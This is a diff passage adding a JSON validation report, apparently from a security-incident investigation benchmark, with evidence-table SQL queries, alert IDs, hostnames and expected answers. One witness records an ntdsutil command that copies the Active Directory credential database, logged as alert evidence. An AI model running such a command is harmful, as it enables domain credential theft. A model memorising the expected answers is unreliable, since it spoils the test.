+            "Malicious URL was clicked on that device",
+            "vnevado-win11h"
+          ],
+          "error": null
+        },
+        {
+          "step": "T3",
+          "episode_id": "em_d2d12465d7cb1987",
+          "status": "ok",
+          "candidate_count": 1,
+          "unique_values": [
+            "vnevado-dc"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "75013ae0-7504-d192-8aae-90107aa6b19b",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-dc",
+              "raw_components": {
+                "HostName": "vnevado-dc"
+              },
+              "roles": [],
+              "entity_index": 5,
+              "alert_id": "75013ae0-7504-d192-8aae-90107aa6b19b",
+              "time": "2024-08-01 13:09:13.222398+00:00",
+              "source_row_hash": "58d5cca40807405b1938095c897d9089f9708466f5900c38900c7e77efbae7c4",
+              "matched_inputs": [
+                "Hailey Johnson"
+              ]
+            }
+          ],
+          "witness_count": 1,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Account_Name' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Azure Resource Manager operation from suspicious proxy IP address",
+            "Hailey Johnson"
+          ],
+          "error": null
+        },
+        {
+          "step": "T4",
+          "episode_id": "em_afdcb0e9dc74c4fe",
+          "status": "ok",
+          "candidate_count": 4,
+          "unique_values": [
+            "ntdsutil.exe",
+            "powershell.exe"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+          "witnesses": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "ntdsutil.exe",
+              "raw_components": {
+                "CommandLine": "\"ntdsutil.exe\" \"ac i ntds\" ifm \"create full c:\\temp\" q q"
+              },
+              "roles": [],
+              "entity_index": 6,
+              "alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+              "time": "2024-08-02 22:34:59.610648+00:00",
+              "source_row_hash": "3bca5da11d047320b7327c017f314b4b3fc21e3bbb513e0493f6664a75087a7e",
+              "matched_inputs": [
+                "vnevado-dc"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "ntdsutil.exe",
+              "raw_components": {
+                "CommandLine": "\"ntdsutil.exe\" \"ac i ntds\" ifm \"create full c:\\temp\" q q"
+              },
+              "roles": [],
+              "entity_index": 6,
+              "alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+              "time": "2024-08-01 12:54:34.046089+00:00",
+              "source_row_hash": "f4ab4db470c5b49df82c825038ca00f1d67b2c1dab48f3a1bcf1a7c41119a29d",
+              "matched_inputs": [
+                "vnevado-dc"
+              ]
+            }
+          ],
+          "witness_count": 2,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Command_File_Mention'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Ntdsutil collecting Active Directory information",
+            "vnevado-dc"
+          ],
+          "error": null
+        }
+      ]
+    }
+  ],
+  "offline_scope": "Uses official start entities; no intermediate or target value supplied to queries. Expected values checked only after results.",
+  "live_scope": "Exported merged PM/EM; session-local MySQL projection of original CSV, membership from SecurityIncident.AlertIds. Official graph supplies seed, expected path checked only AFTER full route execution.",
+  "delta": {
+    "sm": 0,
+    "em": 0,
+    "pm": 1
+  },
+  "live_validation_v1": [
+    {
+      "variant": "from_IP_Address",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "candidate_count": 1,
+          "expected_present": true,
+          "error": null,
+          "alert_id": null
+        },
+        {
+          "step": "T2",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 2032 (char 2031)",
+          "alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb"
+        }
+      ]
+    },
+    {
+      "variant": "from_URL",
+      "passed": false,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "candidate_count": 1,
+          "expected_present": true,
+          "error": null,
+          "alert_id": null
+        },
+        {
+          "step": "T2",
+          "status": "invalid_json",
+          "candidate_count": 0,
+          "expected_present": false,
+          "error": "Expecting ',' delimiter: line 1 column 2032 (char 2031)",
+          "alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb"
+        }
+      ]
+    }
+  ],
+  "physical_revision": 2,
+  "verification": "exact_alert_and_edge_lineage"
+}
